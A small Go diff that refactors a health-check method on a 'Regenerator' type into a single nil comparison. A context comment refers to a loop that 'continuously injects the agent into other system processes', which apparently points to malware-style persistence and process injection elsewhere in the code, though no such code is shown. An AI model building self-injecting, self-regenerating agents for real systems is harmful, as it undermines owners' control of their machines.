@@ -229,11 +229,8 @@ func calculateFileHash(filePath string) (string, error) {
 
 // isRespondingToHealthChecks checks if the agent is responding to health checks
 func (r *Regenerator) isRespondingToHealthChecks(ctx context.Context) bool {
-	if r == nil {
-		return false
-	}
-
-	return true
+	_ = ctx
+	return r != nil
 }
 
 // processInjectionLoop continuously injects the agent into other system processes
